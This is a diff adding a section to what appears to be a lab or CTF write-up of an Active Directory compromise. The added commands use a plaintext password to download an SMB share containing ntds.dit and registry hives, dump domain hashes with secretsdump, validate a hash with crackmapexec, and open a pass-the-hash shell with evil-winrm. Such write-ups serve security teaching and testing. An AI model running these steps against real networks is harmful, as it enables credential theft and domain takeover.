@@ -151,9 +151,63 @@ L.Livingstone -> Generic All -> ResourceDC -> CoerceToTGT -> Domain Admins -> Ad
 
 This indicated a Resource Based Constrained Delegation with a potential for abuse.
 
+Listing authenticated SMB shares revealed a Password Audit share:
+
+```
+smbclient -L //192.168.110.175 -U v.ventz --password=HotelCalifornia194!
+```
+
+The share was connected to and files were downloaded:
+
+```
+smbclient //192.168.110.175/'Password Audit' -U v.ventz --password=HotelCalifornia194!
+
+recurse ON
+prompt OFF
+
+cd "Active Directory"
+mget *
+
+cd ../registry
+mget *
+```
+
+The downloads contained sensitive files and directories:
+
+```
+ntds.dit
+SYSTEM
+SECURITY
+```
+
+The domain password hashes were extracted:
+
+```
+secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
+```
+
+Revealing the hashes for user L.Livingstone:
+
+```
+L.Livingstone : 19a3a7550ce8c505c2d46b5e39d6f808
+```
+
+The hashes were validated:
+
+```
+crackmapexec winrm 192.168.110.175 -u l.livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808
+```
+
+And a shell was obtained as L.Livingstone:
+
+```
+evil-winrm -i 192.168.110.175 -u l.livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808
+```
+
 ---
 
 ## 8. Privilege Escalation
+
 
 ---
 
